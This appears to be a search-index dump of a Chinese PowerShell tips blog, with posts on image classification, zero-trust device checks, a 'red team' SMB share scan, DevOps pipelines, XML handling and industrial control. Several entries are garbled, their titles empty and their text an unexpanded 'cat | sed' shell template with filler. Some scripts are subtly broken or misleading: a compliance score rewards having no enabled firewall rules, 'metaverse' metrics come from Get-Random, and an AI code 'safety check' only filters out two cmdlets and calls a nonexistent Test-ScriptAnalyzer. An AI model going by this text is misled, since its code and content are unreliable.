{Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/08/13/powershell-hardware-monitoring/"},{"title":"PowerShell 技能连载 - 智能图像分类系统","text":"在数字化转型浪潮中，智能图像处理技术日益重要。本文演示如何通过PowerShell调用云端AI服务实现自动化图像分类，提升海量图像资产管理效率。 12345678910111213141516171819202122232425function Invoke-ImageClassification { param( [string]$ImagePath, [string]$ApiKey, [ValidateRange(1,100)] [int]$MaxResults = 5 ) try { $base64Image = [Convert]::ToBase64String((Get-Content $ImagePath -Encoding Byte)) $headers = @{ &quot;Ocp-Apim-Subscription-Key&quot; = $ApiKey } $body = @{ url = &quot;data:image/jpeg;base64,$base64Image&quot; } | ConvertTo-Json $response = Invoke-RestMethod -Uri &quot;https://eastus.api.cognitive.microsoft.com/vision/v3.1/analyze?visualFeatures=Categories&quot; -Method Post -Headers $headers -Body $body $results = $response.categories | Select-Object name, score -First $MaxResults return $results | Format-Table -AutoSize } catch { Write-Error &quot;分类失败：$($_.Exception.Message)&quot; }} 实现原理分析： 将本地图像转换为Base64编码格式进行传输 通过Microsoft Cognitive Services视觉API实现智能分类 参数验证机制确保返回结果数量在合理范围 结构化返回结果便于后续处理分析 异常处理机制捕获网络请求和API调用错误 该脚本将传统图像管理升级为智能分类系统，特别适合需要处理大量用户生成内容的内容管理平台。","link":"/2024/08/15/powershell-ai-image-classification/"},{"title":"","text":"$(cat _posts/2024-08-19-powershell-variable-scope.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/08/19/powershell-variable-scope/"},{"title":"PowerShell 技能连载 - 零信任架构下的设备健康检查自动化","text":"1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253function Invoke-DeviceHealthCheck { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$DeviceName, [ValidateSet('Basic','Full')] [string]$ScanMode = 'Basic' ) $complianceReport = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' DeviceName = $DeviceName EncryptionStatus = $null PatchLevel = $null FirewallRules = @() ComplianceScore = 0 } try { # 验证BitLocker加密状态 $encryptionStatus = Get-BitLockerVolume -MountPoint C: | Select-Object -ExpandProperty EncryptionPercentage $complianceReport.EncryptionStatus = $encryptionStatus -ge 100 ? 'Compliant' : 'Non-Compliant' # 检查系统更新状态 $updates = Get-HotFix | Where-Object InstalledOn -lt (Get-Date).AddDays(-30) $complianceReport.PatchLevel = $updates.Count -eq 0 ? 'Current' : 'Outdated' # 审计防火墙规则（完整扫描模式） if ($ScanMode -eq 'Full') { $firewallRules = Get-NetFirewallRule | Where-Object Enabled -eq True | Select-Object DisplayName, Direction, Action $complianceReport.FirewallRules = $firewallRules } # 计算合规分数 $score = 0 if ($complianceReport.EncryptionStatus -eq 'Compliant') { $score += 40 } if ($complianceReport.PatchLevel -eq 'Current') { $score += 30 } if ($complianceReport.FirewallRules.Count -eq 0) { $score += 30 } $complianceReport.ComplianceScore = $score } catch { Write-Error &quot;设备健康检查失败: $_&quot; } # 生成零信任合规报告 $complianceReport | Export-Clixml -Path &quot;$env:TEMP/${DeviceName}_ComplianceReport_$(Get-Date -Format yyyyMMdd).xml&quot; return $complianceReport} 核心功能： 自动化BitLocker加密状态验证 系统补丁级别智能评估 防火墙规则深度审计（完整扫描模式） 动态合规评分系统 应用场景： 零信任安全架构实施 终端设备合规自动化审计 安全基线动态验证 监管合规报告生成","link":"/2024/08/20/powershell-zero-trust-compliance/"},{"title":"PowerShell 技能连载 - 元宇宙虚拟环境自动化管理","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546function Invoke-MetaverseDeployment { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$EnvironmentBlueprint, [ValidateRange(1,100)] [int]$NodeCount = 5 ) $deploymentReport = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' EnvironmentID = (New-Guid).Guid AllocatedResources = @() PerformanceMetrics = @() } # 虚拟节点资源配置 1..$NodeCount | ForEach-Object { $nodeConfig = [PSCustomObject]@{ NodeID = &quot;VNODE-$((Get-Date).ToString('HHmmssfff'))&quot; CPU = 4 Memory = '16GB' Storage = '500GB SSD' NetworkLatency = (Get-Random -Minimum 2 -Maximum 15) } $deploymentReport.AllocatedResources += $nodeConfig } # 虚拟环境健康检查 $deploymentReport.AllocatedResources | ForEach-Object { $metrics = [PSCustomObject]@{ NodeID = $_.NodeID Throughput = (Get-Random -Minimum 100 -Maximum 1000) PacketLoss = (Get-Random -Minimum 0.1 -Maximum 5.0) AvatarCapacity = (Get-Random -Minimum 50 -Maximum 200) } $deploymentReport.PerformanceMetrics += $metrics } # 生成三维可视化报告 $reportPath = &quot;$env:TEMP/MetaverseReport_$(Get-Date -Format yyyyMMdd).glb&quot; $deploymentReport | ConvertTo-Json -Depth 5 | Out-File -Path $reportPath -Encoding UTF8 return $deploymentReport} 核心功能： 分布式虚拟节点自动配置 网络延迟模拟与容量规划 实时三维性能指标采集 GLB格式可视化报告 应用场景： 元宇宙基础架构部署 虚拟演唱会资源调度 数字孪生工厂监控 虚拟现实教育资源分配","link":"/2024/08/21/powershell-metaverse-management/"},{"title":"","text":"$(cat _posts/2024-08-22-powershell-csv-handling.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n上面的代码演示了PowerShell中的数据处理能力。PowerShell擅长处理各种数据格式，如CSV、XML、JSON等，并提供了丰富的命令和技术来转换、过滤和操作数据。这些功能使PowerShell成为数据提取、转换和加载(ETL)流程的理想选择。\\n/}pd}p’)","link":"/2024/08/22/powershell-csv-handling/"},{"title":"PowerShell 技能连载 - 红队渗透测试自动化框架","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657function Invoke-RedTeamScan { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$TargetRange, [ValidateSet('Basic','Advanced')] [string]$ScanMode = 'Basic' ) $threatReport = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' VulnerableSystems = @() AttackPaths = @() RiskScore = 0 } try { # 检测本地权限提升漏洞 $localVulns = Get-ChildItem HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall | Where-Object { $_.GetValue('DisplayName') -match '脆弱服务' } if ($localVulns) { $threatReport.VulnerableSystems += [PSCustomObject]@{ SystemName = $env:COMPUTERNAME Vulnerability = '本地权限提升' CVE = 'CVE-2024-XXXX' } } # 高级模式横向移动检测 if ($ScanMode -eq 'Advanced') { $networkSystems = Test-NetConnection -ComputerName $TargetRange -Port 445 | Where-Object TcpTestSucceeded $networkSystems | ForEach-Object { $shares = Get-SmbShare -ComputerName $_.RemoteAddress -ErrorAction SilentlyContinue if ($shares) { $threatReport.AttackPaths += [PSCustomObject]@{ Source = $env:COMPUTERNAME Target = $_.RemoteAddress AttackVector = 'SMB共享漏洞' } } } } # 计算风险评分 $threatReport.RiskScore = [math]::Min(100, ($threatReport.VulnerableSystems.Count * 30) + ($threatReport.AttackPaths.Count * 20)) } catch { Write-Error &quot;渗透测试失败: $_&quot; } # 生成红队行动报告 $threatReport | ConvertTo-Json | Out-File -Path &quot;$env:TEMP/RedTeamReport_$(Get-Date -Format yyyyMMdd).json&quot; return $threatReport} 核心功能： 本地权限提升漏洞检测 网络横向移动路径分析 SMB共享漏洞自动化扫描 动态风险评分系统 应用场景： 红队渗透测试演练 企业网络安全评估 攻击路径可视化 安全防御策略验证","link":"/2024/08/23/powershell-red-team-automation/"},{"title":"","text":"$(cat _posts/2024-08-26-powershell-security-policies.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/08/26/powershell-security-policies/"},{"title":"自动化零信任设备健康检查","text":"1234567891011121314151617181920212223242526272829303132function Get-DeviceCompliance { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$ComputerName ) # 验证TPM状态 $tpmStatus = Get-Tpm -ComputerName $ComputerName -ErrorAction SilentlyContinue # 检查BitLocker加密状态 $bitlocker = Get-BitLockerVolume -MountPoint $env:SystemDrive -ErrorAction SilentlyContinue # 获取防病毒状态 $avStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue [PSCustomObject]@{ ComputerName = $ComputerName TPMEnabled = $tpmStatus.TpmPresent SecureBoot = (Confirm-SecureBootUEFI).SecureBootEnabled BitLockerStatus = $bitlocker.VolumeStatus AntivirusEnabled = $avStatus.AMServiceEnabled LastUpdate = (Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 1).InstalledOn }}# 执行企业终端健康检查$devices = 'PC001','PC002','PC003'$report = $devices | ForEach-Object { Get-DeviceCompliance -ComputerName $_ -Verbose}# 生成合规性报告$report | Export-Csv -Path &quot;ZeroTrust_Compliance_Report_$(Get-Date -Format yyyyMMdd).csv&quot; -NoTypeInformation 本脚本实现以下零信任核心检查项： TPM芯片启用状态验证 Secure Boot安全启动配置 系统盘BitLocker加密状态 防病毒实时监控状态 系统最后更新日期 扩展建议： 与Azure AD条件访问策略集成 添加自动修复功能 实现实时监控告警机制","link":"/2024/08/27/automate-zero-trust-healthcheck/"},{"title":"PowerShell 技能连载 - 无服务器环境下的零信任检测","text":"123456789101112131415161718192021222324252627282930313233343536373839404142function Invoke-ServerlessHealthCheck { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$ResourceGroup ) # 获取函数应用运行环境信息 $context = Get-AzContext $functions = Get-AzFunctionApp -ResourceGroupName $ResourceGroup $report = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' FunctionApps = @() SecurityFindings = @() } # 检查TLS版本配置 $functions | ForEach-Object { $config = Get-AzFunctionAppSetting -Name $_.Name -ResourceGroupName $ResourceGroup $appReport = [PSCustomObject]@{ AppName = $_.Name RuntimeVersion = $_.Config.NetFrameworkVersion HTTPSOnly = $_.Config.HttpsOnly MinTLSVersion = $config['minTlsVersion'] } $report.FunctionApps += $appReport if ($appReport.MinTLSVersion -lt '1.2') { $report.SecurityFindings += [PSCustomObject]@{ Severity = 'High' Description = &quot;函数应用 $($_.Name) 使用不安全的TLS版本: $($appReport.MinTLSVersion)&quot; Recommendation = '在应用设置中将minTlsVersion更新为1.2' } } } # 生成安全报告 $report | Export-Clixml -Path &quot;$env:TEMP/ServerlessSecurityReport_$(Get-Date -Format yyyyMMdd).xml&quot; return $report} 核心功能： Azure Functions运行环境自动检测 TLS安全配置合规检查 零信任架构下的安全基线验证 自动化XML报告生成 典型应用场景： 无服务器架构安全审计 云环境合规自动化核查 持续安全监控(CSM)实现 DevOps流水线安全卡点集成","link":"/2024/08/28/powershell-serverless-security/"},{"title":"","text":"$(cat _posts/2024-08-30-powershell-psprovider-deepdive.md | sed -e ‘//,//{// { h s/.*// } // {Gs/$/\\n\\n这段PowerShell代码展示了基本的命令用法，通过这些命令可以执行常见的系统管理任务。PowerShell作为一种强大的脚本语言和命令行工具，设计用于系统管理和自动化配置管理，使IT专业人员能够更高效地控制和管理Windows操作系统和各种应用程序。\\n/}pd}p’)","link":"/2024/08/30/powershell-psprovider-deepdive/"},{"title":"PowerShell 技能连载 - AI 智能脚本生成引擎优化","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758function Invoke-AIScriptGeneration { [CmdletBinding()] param( [Parameter(Mandatory=$true)] [string]$NaturalLanguageQuery, [ValidateRange(1,5)] [int]$MaxAttempts = 3 ) $codeReport = [PSCustomObject]@{ Timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss' GeneratedScript = $null ValidationErrors = @() OptimizationLevel = 0 } try { $prompt = @&quot;作为PowerShell专家，请将以下运维需求转换为安全可靠的代码：需求：$NaturalLanguageQuery要求：1. 包含try/catch错误处理2. 支持WhatIf预执行模式3. 输出结构化对象4. 符合PowerShell最佳实践&quot;@ # 调用OpenAI API $response = Invoke-RestMethod -Uri 'https://api.openai.com/v1/chat/completions' \\ -Headers @{ Authorization = &quot;Bearer $env:OPENAI_API_KEY&quot; } \\ -Body (@{ model = &quot;gpt-4-turbo&quot; messages = @(@{ role = &quot;user&quot;; content = $prompt }) temperature = 0.2 max_tokens = 1500 } | ConvertTo-Json) # 代码安全验证 $validationResults = $response.choices[0].message.content | Where-Object { $_ -notmatch 'Remove-Item|Format-Table' } | Test-ScriptAnalyzer -Severity Error $codeReport.GeneratedScript = $response.choices[0].message.content $codeReport.ValidationErrors = $validationResults $codeReport.OptimizationLevel = (100 - ($validationResults.Count * 20)) } catch { Write-Error &quot;AI脚本生成失败: $_&quot; if ($MaxAttempts -gt 1) { return Invoke-AIScriptGeneration -NaturalLanguageQuery $NaturalLanguageQuery -MaxAttempts ($MaxAttempts - 1) } } # 生成智能编码报告 $codeReport | Export-Csv -Path &quot;$env:TEMP/AIScriptReport_$(Get-Date -Format yyyyMMdd).csv&quot; -NoTypeInformation return $codeReport} 核心功能： 自然语言到代码的智能转换 生成代码的安全验证 多轮重试机制 代码优化评分系统 应用场景： 运维需求快速原型开发 新手脚本编写辅助 跨团队需求标准化 自动化脚本知识库构建","link":"/2024/09/02/powershell-ai-script-generation/"},{"title":"PowerShell 技能连载 - DevOps 集成","text":"在DevOps时代，PowerShell可以帮助我们更好地实现持续集成和持续部署。本文将介绍如何使用PowerShell构建一个DevOps自动化系统，包括CI/CD流程管理、基础设施即代码和制品管理等功能。 CI/CD流程管理首先，让我们创建一个用于管理CI/CD流程的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293function Manage-DevOpsPipeline { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$PipelineID, [Parameter()] [string[]]$PipelineTypes, [Parameter()] [ValidateSet(&quot;Build&quot;, &quot;Test&quot;, &quot;Deploy&quot;)] [string]$OperationMode = &quot;Build&quot;, [Parameter()] [hashtable]$PipelineConfig, [Parameter()] [string]$LogPath ) try { $manager = [PSCustomObject]@{ PipelineID = $PipelineID StartTime = Get-Date PipelineStatus = @{} Operations = @{} Issues = @() } # 获取流程配置 $config = Get-PipelineConfig -PipelineID $PipelineID # 管理流程 foreach ($type in $PipelineTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Operations = @{} Issues = @() } # 应用流程配置 $typeConfig = Apply-PipelineConfig ` -Config $config ` -Type $type ` -Mode $OperationMode ` -Settings $PipelineConfig $status.Config = $typeConfig # 执行流程操作 $operations = Execute-PipelineOperations ` -Type $type ` -Config $typeConfig $status.Operations = $operations $manager.Operations[$type] = $operations # 检查流程问题 $issues = Check-PipelineIssues ` -Operations $operations ` -Config $typeConfig $status.Issues = $issues $manager.Issues += $issues # 更新流程状态 if ($issues.Count -gt 0) { $status.Status = &quot;Failed&quot; } else { $status.Status = &quot;Success&quot; } $manager.PipelineStatus[$type] = $status } # 记录流程日志 if ($LogPath) { $manager | ConvertTo-Json -Depth 10 | Out-File -FilePath $LogPath } # 更新管理器状态 $manager.EndTime = Get-Date return $manager } catch { Write-Error &quot;DevOps流程管理失败：$_&quot; return $null }} 基础设施即代码接下来，创建一个用于管理基础设施即代码的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697function Manage-InfrastructureAsCode { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$InfraID, [Parameter()] [string[]]$InfraTypes, [Parameter()] [ValidateSet(&quot;Terraform&quot;, &quot;DSC&quot;, &quot;ARM&quot;)] [string]$InfraMode = &quot;Terraform&quot;, [Parameter()] [hashtable]$InfraConfig, [Parameter()] [string]$ReportPath ) try { $manager = [PSCustomObject]@{ InfraID = $InfraID StartTime = Get-Date InfraStatus = @{} Configurations = @{} Issues = @() } # 获取基础设施配置 $config = Get-InfraConfig -InfraID $InfraID # 管理基础设施 foreach ($type in $InfraTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Configurations = @{} Issues = @() } # 应用基础设施配置 $typeConfig = Apply-InfraConfig ` -Config $config ` -Type $type ` -Mode $InfraMode ` -Settings $InfraConfig $status.Config = $typeConfig # 配置基础设施 $configurations = Configure-InfraResources ` -Type $type ` -Config $typeConfig $status.Configurations = $configurations $manager.Configurations[$type] = $configurations # 检查基础设施问题 $issues = Check-InfraIssues ` -Configurations $configurations ` -Config $typeConfig $status.Issues = $issues $manager.Issues += $issues # 更新基础设施状态 if ($issues.Count -gt 0) { $status.Status = &quot;Warning&quot; } else { $status.Status = &quot;Success&quot; } $manager.InfraStatus[$type] = $status } # 生成报告 if ($ReportPath) { $report = Generate-InfraReport ` -Manager $manager ` -Config $config $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新管理器状态 $manager.EndTime = Get-Date return $manager } catch { Write-Error &quot;基础设施即代码管理失败：$_&quot; return $null }} 上面的代码定义了一个名为 Manage-DevOpsPipeline 的PowerShell函数，用于执行特定的自动化任务。该函数封装了一系列操作，使得脚本更加模块化和可重用。 制品管理最后，创建一个用于管理制品的函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697function Manage-Artifacts { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$ArtifactID, [Parameter()] [string[]]$ArtifactTypes, [Parameter()] [ValidateSet(&quot;Package&quot;, &quot;Container&quot;, &quot;Binary&quot;)] [string]$ArtifactMode = &quot;Package&quot;, [Parameter()] [hashtable]$ArtifactConfig, [Parameter()] [string]$ReportPath ) try { $manager = [PSCustomObject]@{ ArtifactID = $ArtifactID StartTime = Get-Date ArtifactStatus = @{} Operations = @{} Issues = @() } # 获取制品配置 $config = Get-ArtifactConfig -ArtifactID $ArtifactID # 管理制品 foreach ($type in $ArtifactTypes) { $status = [PSCustomObject]@{ Type = $type Status = &quot;Unknown&quot; Config = @{} Operations = @{} Issues = @() } # 应用制品配置 $typeConfig = Apply-ArtifactConfig ` -Config $config ` -Type $type ` -Mode $ArtifactMode ` -Settings $ArtifactConfig $status.Config = $typeConfig # 执行制品操作 $operations = Execute-ArtifactOperations ` -Type $type ` -Config $typeConfig $status.Operations = $operations $manager.Operations[$type] = $operations # 检查制品问题 $issues = Check-ArtifactIssues ` -Operations $operations ` -Config $typeConfig $status.Issues = $issues $manager.Issues += $issues # 更新制品状态 if ($issues.Count -gt 0) { $status.Status = &quot;Warning&quot; } else { $status.Status = &quot;Success&quot; } $manager.ArtifactStatus[$type] = $status } # 生成报告 if ($ReportPath) { $report = Generate-ArtifactReport ` -Manager $manager ` -Config $config $report | ConvertTo-Json -Depth 10 | Out-File -FilePath $ReportPath } # 更新管理器状态 $manager.EndTime = Get-Date return $manager } catch { Write-Error &quot;制品管理失败：$_&quot; return $null }} 使用示例以下是如何使用这些函数来管理DevOps环境的示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159# 管理CI/CD流程$manager = Manage-DevOpsPipeline -PipelineID &quot;PIPELINE001&quot; ` -PipelineTypes @(&quot;Build&quot;, &quot;Test&quot;, &quot;Deploy&quot;) ` -OperationMode &quot;Build&quot; ` -PipelineConfig @{ &quot;Build&quot; = @{ &quot;Source&quot; = @{ &quot;Repository&quot; = &quot;https://github.com/org/repo&quot; &quot;Branch&quot; = &quot;main&quot; &quot;Trigger&quot; = &quot;push&quot; } &quot;Steps&quot; = @{ &quot;Restore&quot; = @{ &quot;Command&quot; = &quot;dotnet restore&quot; &quot;WorkingDirectory&quot; = &quot;src&quot; } &quot;Build&quot; = @{ &quot;Command&quot; = &quot;dotnet build&quot; &quot;WorkingDirectory&quot; = &quot;src&quot; } &quot;Publish&quot; = @{ &quot;Command&quot; = &quot;dotnet publish&quot; &quot;WorkingDirectory&quot; = &quot;src&quot; } } &quot;Artifacts&quot; = @{ &quot;Path&quot; = &quot;src/bin/Release/net6.0/publish&quot; &quot;Type&quot; = &quot;zip&quot; } } &quot;Test&quot; = @{ &quot;Framework&quot; = &quot;xunit&quot; &quot;Projects&quot; = @(&quot;tests/UnitTests&quot;, &quot;tests/IntegrationTests&quot;) &quot;Coverage&quot; = @{ &quot;Enabled&quot; = $true &quot;Threshold&quot; = 80 } } &quot;Deploy&quot; = @{ &quot;Environment&quot; = &quot;Production&quot; &quot;Strategy&quot; = &quot;BlueGreen&quot; &quot;Targets&quot; = @{ &quot;Web&quot; = @{ &quot;Type&quot; = &quot;AppService&quot; &quot;ResourceGroup&quot; = &quot;rg-prod&quot; &quot;Name&quot; = &quot;app-prod&quot; } &quot;Database&quot; = @{ &quot;Type&quot; = &quot;SqlServer&quot; &quot;ResourceGroup&quot; = &quot;rg-prod&quot; &quot;Name&quot; = &quot;sql-prod&quot; } } } } ` -LogPath &quot;C:\\Logs\\pipeline_management.json&quot;# 管理基础设施即代码$manager = Manage-InfrastructureAsCode -InfraID &quot;INFRA001&quot; ` -InfraTypes @(&quot;Network&quot;, &quot;Compute&quot;, &quot;Storage&quot;) ` -InfraMode &quot;Terraform&quot; ` -InfraConfig @{ &quot;Network&quot; = @{ &quot;Provider&quot; = &quot;azurerm&quot; &quot;Resources&quot; = @{ &quot;VNet&quot; = @{ &quot;Name&quot; = &quot;vnet-prod&quot; &quot;AddressSpace&quot; = &quot;10.0.0.0/16&quot; &quot;Subnets&quot; = @{ &quot;Web&quot; = &quot;10.0.1.0/24&quot; &quot;App&quot; = &quot;10.0.2.0/24&quot; &quot;Data&quot; = &quot;10.0.3.0/24&quot; } } &quot;NSG&quot; = @{ &quot;Name&quot; = &quot;nsg-prod&quot; &quot;Rules&quot; = @{ &quot;HTTP&quot; = @{ &quot;Priority&quot; = 100 &quot;Protocol&quot; = &quot;Tcp&quot; &quot;Port&quot; = 80 &quot;Source&quot; = &quot;Internet&quot; &quot;Destination&quot; = &quot;Web&quot; } } } } } &quot;Compute&quot; = @{ &quot;Provider&quot; = &quot;azurerm&quot; &quot;Resources&quot; = @{ &quot;VMSS&quot; = @{ &quot;Name&quot; = &quot;vmss-web&quot; &quot;Capacity&quot; = 3 &quot;Size&quot; = &quot;Standard_D2s_v3&quot; &quot;Image&quot; = &quot;UbuntuLTS&quot; } &quot;AppService&quot; = @{ &quot;Name&quot; = &quot;app-prod&quot; &quot;Plan&quot; = &quot;PremiumV2&quot; &quot;Runtime&quot; = &quot;dotnet:6.0&quot; } } } &quot;Storage&quot; = @{ &quot;Provider&quot; = &quot;azurerm&quot; &quot;Resources&quot; = @{ &quot;StorageAccount&quot; = @{ &quot;Name&quot; = &quot;stprod&quot; &quot;Type&quot; = &quot;Standard_LRS&quot; &quot;Replication&quot; = &quot;GRS&quot; } &quot;Container&quot; = @{ &quot;Name&quot; = &quot;data&quot; &quot;Access&quot; = &quot;private&quot; } } } } ` -ReportPath &quot;C:\\Reports\\infrastructure_management.json&quot;# 管理制品$manager = Manage-Artifacts -ArtifactID &quot;ARTIFACT001&quot; ` -ArtifactTypes @(&quot;Package&quot;, &quot;Container&quot;, &quot;Binary&quot;) ` -ArtifactMode &quot;Package&quot; ` -ArtifactConfig @{ &quot;Package&quot; = @{ &quot;Type&quot; = &quot;NuGet&quot; &quot;Name&quot; = &quot;MyApp&quot; &quot;Version&quot; = &quot;1.0.0&quot; &quot;Source&quot; = &quot;src/MyApp&quot; &quot;Target&quot; = @{ &quot;Feed&quot; = &quot;https://pkgs.dev.azure.com/org/project/_packaging/feed/nuget/v3/index.json&quot; &quot;ApiKey&quot; = &quot;env:NUGET_API_KEY&quot; } } &quot;Container&quot; = @{ &quot;Type&quot; = &quot;Docker&quot; &quot;Name&quot; = &quot;myapp&quot; &quot;Tag&quot; = &quot;1.0.0&quot; &quot;Source&quot; = &quot;Dockerfile&quot; &quot;Target&quot; = @{ &quot;Registry&quot; = &quot;myregistry.azurecr.io&quot; &quot;Username&quot; = &quot;env:ACR_USERNAME&quot; &quot;Password&quot; = &quot;env:ACR_PASSWORD&quot; } } &quot;Binary&quot; = @{ &quot;Type&quot; = &quot;Zip&quot; &quot;Name&quot; = &quot;myapp-release&quot; &quot;Version&quot; = &quot;1.0.0&quot; &quot;Source&quot; = &quot;src/MyApp/bin/Release&quot; &quot;Target&quot; = @{ &quot;Storage&quot; = &quot;stprod&quot; &quot;Container&quot; = &quot;releases&quot; } } } ` -ReportPath &quot;C:\\Reports\\artifact_management.json&quot; 最佳实践 实施CI/CD流程 配置基础设施即代码 管理制品版本 保持详细的部署记录 定期进行健康检查 实施监控策略 建立告警机制 保持系统文档更新","link":"/2024/09/03/powershell-devops-integration/"},{"title":"PowerShell 技能连载 - XML数据处理实战","text":"XML作为结构化数据交换标准，在PowerShell中可通过原生命令实现高效处理。 12345678910# 读取服务器配置XML$configPath = 'servers.xml'[xml]$xmlData = Get-Content $configPath# 查询所有生产环境服务器$prodServers = $xmlData.Configuration.Servers.Server | Where-Object { $_.Environment -eq 'Production'}$prodServers | Format-Table Name, IPAddress, Role XML生成与修改 创建带命名空间的XML文档：123456789101112$ns = @{ns='http://schemas.vichamp.com/config'}$xmlWriter = New-Object System.Xml.XmlTextWriter('new_config.xml',$null)$xmlWriter.WriteStartDocument()$xmlWriter.WriteStartElement('ns','Configuration','http://schemas.vichamp.com/config')$xmlWriter.WriteStartElement('Server') $xmlWriter.WriteAttributeString('Name','web01')$xmlWriter.WriteElementString('IP','192.168.1.101')$xmlWriter.WriteEndElement()$xmlWriter.WriteEndDocument()$xmlWriter.Close() 这段PowerShell代码实现了XML生成与修改功能。通过执行这些命令，可以自动化完成相关操作，提高工作效率。 使用Select-Xml进行复杂查询：12345678$result = Select-Xml -Path $configPath -XPath &quot;//Server[@Role='Database']&quot;$result.Node | ForEach-Object { [PSCustomObject]@{ Cluster = $_.ParentNode.Name ServerName = $_.Name Version = $_.GetAttribute('Version') }} 最佳实践： 使用强类型[xml]加速处理 通过XPath实现精准查询 合理处理XML命名空间 使用XMLTextWriter生成合规文档","link":"/2024/09/04/powershell-xml-parsing/"},{"title":"PowerShell 技能连载 - 工业控制系统管理","text":"在工业环境中，控制系统管理对于确保生产效率和安全性至关重要。本文将介绍如何使用PowerShell构建一个工业控制系统管理平台，包括过程控制、数据采集、报警管理等功能。 过程控制首先，让我们创建一个用于管理工业过程控制的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293function Manage-ProcessControl { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$ProcessID, [Parameter()] [hashtable]$Parameters, [Parameter()] [string]$Mode, [Parameter()] [switch]$AutoStart, [Parameter()] [int]$Timeout = 300 ) try { $control = [PSCustomObject]@{ ProcessID = $ProcessID StartTime = Get-Date Mode = $Mode Parameters = $Parameters Status = &quot;Initializing&quot; Steps = @() } # 检查过程状态 $processStatus = Get-ProcessStatus -ProcessID $ProcessID if ($processStatus.IsRunning) { throw &quot;过程 $ProcessID 已经在运行中&quot; } # 验证参数 $validationResult = Test-ProcessParameters -ProcessID $ProcessID -Parameters $Parameters if (-not $validationResult.IsValid) { throw &quot;参数验证失败：$($validationResult.Message)&quot; } # 获取控制步骤 $steps = Get-ProcessSteps -ProcessID $ProcessID -Mode $Mode foreach ($step in $steps) { $stepResult = [PSCustomObject]@{ StepID = $step.ID Description = $step.Description StartTime = Get-Date Status = &quot;InProgress&quot; } try { # 执行控制步骤 $result = Invoke-ProcessStep -ProcessID $ProcessID ` -StepID $step.ID ` -Parameters $step.Parameters $stepResult.Status = &quot;Success&quot; $stepResult.Result = $result # 检查步骤结果 if (-not $result.Success) { throw &quot;步骤 $($step.ID) 执行失败：$($result.Message)&quot; } } catch { $stepResult.Status = &quot;Failed&quot; $stepResult.Error = $_.Exception.Message throw } finally { $stepResult.EndTime = Get-Date $control.Steps += $stepResult } } # 更新控制状态 $control.Status = &quot;Running&quot; $control.EndTime = Get-Date # 如果启用自动启动，开始监控过程 if ($AutoStart) { Start-ProcessMonitoring -ProcessID $ProcessID -Timeout $Timeout } return $control } catch { Write-Error &quot;过程控制失败：$_&quot; return $null }} 数据采集接下来，创建一个用于采集工业过程数据的函数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101function Collect-ProcessData { [CmdletBinding()] param( [Parameter(Mandatory = $true)] [string]$ProcessID, [Parameter(Mandatory = $true)] [DateTime]$StartTime, [Parameter(Mandatory = $true)] [DateTime]$EndTime, [Parameter()] [string[]]$Tags, [Parameter()] [int]$SamplingRate = 1, [Parameter()] [string]$StoragePath, [Parameter()] [ValidateSet(&quot;Raw&quot;, &quot;Aggregated&quot;, &quot;Both&quot;)] [string]$DataFormat = &quot;Both&quot; ) try { $collection = [PSCustomObject]@{ ProcessID = $ProcessID StartTime = $StartTime EndTime = $EndTime Tags = $Tags SamplingRate = $SamplingRate 